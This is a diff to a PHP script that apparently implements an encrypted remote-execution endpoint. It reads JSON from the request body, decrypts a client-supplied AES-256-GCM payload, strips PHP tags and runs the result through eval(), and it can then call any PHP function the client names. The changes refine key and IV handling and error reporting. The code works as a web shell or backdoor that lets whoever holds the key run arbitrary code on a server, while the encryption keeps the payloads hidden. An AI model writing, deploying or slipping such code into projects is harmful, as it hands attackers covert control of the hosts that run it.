@@ -1,6 +1,33 @@
 <?php
 
 declare(strict_types=1);
+
+function exception_handler(Throwable $exception)
+{
+    $currentDate = new DateTime();
+    $errorObj = [
+        "timestamp" => $currentDate->format('c'),
+        "error" => get_class($exception),
+        "message" => $exception->getMessage(),
+    ];
+    header('Content-Type: application/json');
+    $response_code = 500;
+    if ($exception instanceof UserException) {
+        $response_code = 400;
+    }
+    http_response_code($response_code);
+    echo json_encode($errorObj);
+}
+
+set_exception_handler('exception_handler');
+
+class UserException extends Exception
+{
+    public function __construct($message = '', $code = 0, Throwable $previous = null)
+    {
+        parent::__construct($message, $code, $previous);
+    }
+}
 class MultipleExceptions extends Exception
 {
     /**
@@ -26,7 +53,7 @@ class MultipleExceptions extends Exception
                 $message .= "Exception does not have a message...";
                 continue;
             }
-            $message .=  "\"{$exception->getMessage()}\" ";
+            $message .=  "\"{$exception->getMessage()}\" \n";
         }
         return $message;
     }
@@ -259,9 +286,14 @@ class OpensslDecryptor implements Decryptor
     private $passphrase;
     /**
      * @readonly
-     * @var string|null
+     * @var string
      */
     private $tag;
+    /**
+     * @readonly
+     * @var string
+     */
+    private $iv;
     /**
      * @var int
      */
@@ -269,19 +301,19 @@ class OpensslDecryptor implements Decryptor
     /**
      * @var string
      */
-    private $iv = "";
+    private $aad = "";
     /**
      * @var string
      */
-    private $aad = "";
+    public static $wantedOpenSslCipher = "aes-256-gcm";
     private function getClassObjs(): array
     {
         return [
             "cipher_algo" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
             "passphrase" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
-            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "tag" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
             "options" => new ClassObjTyping(Typing::INTEGER, ClassObjOptional::OPTIONAL),
-            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
+            "iv" => new ClassObjTyping(Typing::STRING, ClassObjOptional::MANDATORY),
             "aad" =>  new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
         ];
     }
@@ -289,12 +321,14 @@ class OpensslDecryptor implements Decryptor
     {
         $this->validate($args);
         $this->cipher_algo = $args["cipher_algo"];
-        $this->passphrase = $args["passphrase"];
-        $optArgs = ["tag", "options", "iv", "aad"];
-        foreach ($optArgs as $optArg) {
-            if (isset($args[$optArg])) {
-                $this->$optArg = $args[$optArg];
-            }
+        $this->passphrase = hex2bin((string) $args["passphrase"]);
+        $this->iv = hex2bin((string) $args["iv"]);
+        $this->tag = hex2bin((string) $args["tag"]);
+        if (isset($args["options"])) {
+            $this->options = $args["options"];
+        }
+        if (isset($args["aad"])) {
+            $this->aad = $args["aad"];
         }
     }
     /**
@@ -370,10 +404,6 @@ class TestPhpOpenssl implements DecryptorTester
         "openssl_decrypt",
         "openssl_get_cipher_methods"
     ];
-    /**
-     * @var string
-     */
-    private $wantedOpenSslCipher = "aes-256-gcm";
     private function __construct()
     {
     }
@@ -396,10 +426,10 @@ class TestPhpOpenssl implements DecryptorTester
     final public function testOpensslCipher(): ?string
     {
         $ciphers = openssl_get_cipher_methods();
-        if (in_array($this->wantedOpenSslCipher, $ciphers)) {
-            return $this->wantedOpenSslCipher;
+        if (in_array(OpensslDecryptor::$wantedOpenSslCipher, $ciphers)) {
+            return OpensslDecryptor::$wantedOpenSslCipher;
         }
-        throw new UnavailableCipherException($this->wantedOpenSslCipher);
+        throw new UnavailableCipherException(OpensslDecryptor::$wantedOpenSslCipher);
     }
 
     public function launch(): void
@@ -471,6 +501,7 @@ class Executor
      */
     private $decryptor;
     /**
+     * @readonly
      * @var mixed[]
      */
     private $decryptorData;
@@ -485,24 +516,29 @@ class Executor
     private function getClassObjs(): array
     {
         return [
-            "decryptor" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::MANDATORY),
+            "decryptor" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::MANDATORY),
             "command" => new ClassObjTyping(Typing::STRING, ClassObjOptional::OPTIONAL),
-            "parameters" => new ClassObjTyping(Typing::OBJECT, ClassObjOptional::OPTIONAL),
+            "parameters" => new ClassObjTyping(Typing::ARRAY, ClassObjOptional::OPTIONAL),
         ];
     }
     private function __construct()
     {
         $rawClientData = file_get_contents('php://input');
-        $clientData = json_decode(
-            $rawClientData,
-            true,
-            512,
-            0
-        );
-        if (json_last_error() !== JSON_ERROR_NONE) {
-            throw new \Exception(json_last_error_msg());
+        try {
+            $clientData = json_decode(
+                $rawClientData,
+                true,
+                512,
+                0
+            );
+        } catch (Exception $e) {
+            throw new UserException($e->getMessage(), $e->getCode(), $e);
         }
-        $this->validate($clientData);
+        try {
+            $this->validate($clientData);
+        } catch (Exception $exception) {
+            throw new UserException("fail to validate send data", $exception->getCode(), $exception);
+        }
         $this->decryptorData = $clientData["decryptor"];
         if (isset($clientData["command"])) {
             $this->command = $clientData["command"];
@@ -513,18 +549,28 @@ class Executor
         $decryptorPtr = GetPHP::getInstance()->getDecryptor();
         $this->decryptor = $decryptorPtr::getInstance($this->decryptorData);
     }
+
+    private function formatPhpString(string &$phpString): void
+    {
+        $removeSubStrings = ["<?php", "?>", "<?"];
+        foreach ($removeSubStrings as $subString) {
+            $phpString = str_replace($subString, "", $phpString);
+        }
+    }
     /**
+     * @param string $encryptedPhpString
      * @return mixed
      */
-    private function exec(string $encryptedPhpString)
+    public function exec($encryptedPhpString)
     {
         $phpString = $this->decryptor->decrypt($encryptedPhpString);
+        $this->formatPhpString($phpString);
         $evalReturn = eval($phpString);
         if (!$this->command) {
             return $evalReturn;
         }
         if (!function_exists($this->command)) {
-            throw new Exception("function {$this->command} does not exist");
+            throw new UserException("function {$this->command} does not exist");
         }
         return call_user_func($this->command, $this->parameters);
     }
